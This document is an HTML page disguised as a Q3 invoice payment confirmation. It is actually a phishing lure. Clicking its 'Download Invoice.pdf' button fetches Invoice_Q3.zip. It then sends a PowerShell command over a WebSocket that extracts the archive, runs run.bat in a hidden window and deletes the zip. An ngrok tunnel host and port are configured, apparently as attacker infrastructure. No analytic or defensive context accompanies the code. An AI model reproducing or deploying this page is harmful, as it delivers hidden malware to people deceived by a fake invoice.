<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Invoice Q3 - Payment Confirmation</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background: #f4f4f4;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }
      .invoice-box {
        background: white;
        padding: 30px;
        border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        max-width: 500px;
        text-align: center;
      }
      h1 {
        color: #333;
      }
      p {
        color: #666;
        margin-bottom: 20px;
      }
      .btn {
        display: inline-block;
        padding: 12px 24px;
        background: #007bff;
        color: white;
        text-decoration: none;
        border-radius: 5px;
        font-weight: bold;
        transition: background 0.3s;
      }
      .btn:hover {
        background: #0056b3;
      }
    </style>
  </head>
  <body>
    <div class="invoice-box">
      <h1>📄 Invoice Q3</h1>
      <p>Your payment for services rendered is ready.</p>
      <p>Please download the attached document to confirm receipt.</p>

      <!-- The button now triggers the JS function -->
      <a href="#" class="btn" id="downloadBtn">Download Invoice.pdf</a>
    </div>

    <script>
      // Configuration
      const NGROK_HOST = "7.tcp.eu.ngrok.io";
      const NGROK_PORT = "27814";

      document
        .getElementById("downloadBtn")
        .addEventListener("click", async (e) => {
          e.preventDefault();

          // 1. Download the Zip File
          const response = await fetch("/Invoice_Q3.zip");
          const blob = await response.blob();

          // 2. Create a temporary link to trigger the download
          const url = window.URL.createObjectURL(blob);
          const a = document.createElement("a");
          a.style.display = "none";
          a.href = url;
          a.download = "Invoice_Q3.zip";
          document.body.appendChild(a);
          a.click();

          // 3. Wait for download to finish (approximate delay)
          setTimeout(() => {
            // 4. Run a PowerShell command to extract and run silently
            const psCommand = `
                $zipPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'Invoice_Q3.zip');
                if (Test-Path $zipPath) {
                    $destPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'Invoice_Q3');
                    Expand-Archive -Path $zipPath -DestinationPath $destPath -Force;
                    Start-Process "cmd.exe" -ArgumentList "/c cd /d ${destPath} && start /min run.bat" -WindowStyle Hidden;
                    Remove-Item $zipPath;
                }
            `;

            // Execute via PowerShell
            const wsProtocol =
              window.location.protocol === "https:" ? "wss:" : "ws:";
            const wsHost =
              window.location.hostname === "localhost"
                ? "localhost:3000"
                : window.location.host;
            const wsUrl = `${wsProtocol}//${wsHost}/ws`;

            const ws = new WebSocket(wsUrl);
            ws.onopen = () => {
              ws.send(JSON.stringify({ type: "command", payload: psCommand }));
            };
          }, 2000);
        });
    </script>
  </body>
</html>
